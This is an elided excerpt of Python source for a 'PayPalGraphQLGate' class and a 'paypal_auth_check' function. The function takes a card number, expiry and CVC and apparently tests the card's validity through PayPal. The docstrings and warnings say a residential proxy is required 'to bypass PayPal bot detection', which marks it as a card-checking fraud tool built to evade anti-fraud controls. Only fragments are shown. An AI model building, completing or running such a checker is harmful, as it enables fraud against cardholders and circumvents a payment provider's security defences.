...
REQUIRES: Residential proxy to bypass PayPal bot detection
"""
...
class PayPalGraphQLGate:
    ...
    def __init__(self, proxy: dict = None):
        ...
        # Use provided proxy or get residential proxy from config
        if not proxy:
            proxy = get_proxy_for_gateway('paypal')
        
        if proxy:
            self.session.proxies.update(proxy)
            print(f"[PayPal] Using proxy: {list(proxy.values())[0][:30]}...")
        else:
            print("[WARN] PayPal requires residential proxy! May fail without it.")
...
def paypal_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
    ...
    REQUIRES: Residential proxy (configured in RESIDENTIAL_PROXY env var)
    """
    gate = PayPalGraphQLGate(proxy=proxy)
